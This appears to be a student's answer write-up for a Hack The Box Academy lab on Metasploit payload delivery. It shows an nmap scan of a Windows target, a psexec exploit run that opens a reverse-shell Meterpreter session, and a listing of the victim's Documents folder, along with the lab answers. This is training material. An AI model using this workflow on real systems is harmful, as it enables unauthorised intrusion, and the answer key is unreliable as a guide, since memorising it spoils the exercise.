# Section 07: Automating Payloads & Delivery with Metasploit

Module: 08. Shells & Payloads

---

## Questions & Answers

### 1. What command language interpreter is used to establish a system shell session with the target?

Context:
```bash
┌─[eu-academy-1]─[10.10.15.177]─[htb-ac-2162140@htb-oewupgk2aq]─[~]
└──╼ [★]$ nmap -sC -sV -v 10.129.201.160
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-27 23:48 EDT

PORT     STATE SERVICE      VERSION
7/tcp    open  echo
9/tcp    open  discard?
13/tcp   open  daytime      Microsoft Windows USA daytime
17/tcp   open  qotd         Windows qotd (English)
19/tcp   open  chargen
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 10 Pro 18363 microsoft-ds (workgroup: WORKGROUP)
2179/tcp open  vmrdp?
Service Info: Host: SHELLS-WIN10; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 18363 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Shells-Win10
|   NetBIOS computer name: SHELLS-WIN10\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-27T20:51:24-07:00
|_clock-skew: mean: 2h20m01s, deviation: 4h02m30s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-07-28T03:51:26
|_  start_date: N/A

[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> run
[*] Started reverse TCP handler on 10.10.15.177:4444 
[*] 10.129.201.160:445 - Connecting to the server...
[*] 10.129.201.160:445 - Authenticating to 10.129.201.160:445 as user 'htb-student'...
[*] 10.129.201.160:445 - Selecting PowerShell target
[*] 10.129.201.160:445 - Executing the payload...
[+] 10.129.201.160:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (190534 bytes) to 10.129.201.160
[*] Meterpreter session 1 opened (10.10.15.177:4444 -> 10.129.201.160:49874) at 2026-07-28 00:14:55 -0400
```

**Answer:** `powershell`

---

### 2. Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)

Context:
```bash
C:\Windows\system32>dir C:\Users\htb-student\Documents
dir C:\Users\htb-student\Documents
 Volume in drive C has no label.
 Volume Serial Number is C41A-F2ED

 Directory of C:\Users\htb-student\Documents

10/16/2021  01:17 PM    <DIR>          .
10/16/2021  01:17 PM    <DIR>          ..
10/16/2021  01:16 PM               268 staffsalaries.txt
               1 File(s)            268 bytes
               2 Dir(s)  11,410,391,040 bytes free
```

**Answer:** `staffsalaries.txt`

---


[Back to Module Index](./README.md)
